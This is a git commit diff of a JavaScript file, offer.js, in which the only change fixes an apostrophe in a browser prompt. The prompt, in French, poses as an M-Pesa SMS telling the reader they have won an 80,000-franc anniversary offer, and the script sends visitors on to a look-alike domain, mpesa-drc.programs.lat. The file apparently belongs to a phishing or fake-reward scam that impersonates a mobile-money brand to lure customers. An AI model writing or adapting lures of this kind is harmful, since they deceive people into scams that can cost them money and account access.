103708c83809b211153445f25ad2d65aad82c638
decullian <decullianresort@gmail.com>
2024-10-02 03:01:27 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '80.000Francs'
-password=prompt('SMS : Félicitations Vous faites partie des clients M-Pesa à bénéficier de loffre anniversaire de 80000F, veuillez appuyer sur OK pour retirer de l'argent ','80.000Francs');
+password=prompt('SMS : Félicitations Vous faites partie des clients M-Pesa à bénéficier de loffre anniversaire de 80000F, veuillez appuyer sur OK pour retirer de largent ','80.000Francs');
 if (password != '80.000Francs') {
 location.href='https://mpesa-drc.programs.lat/offre';
 }
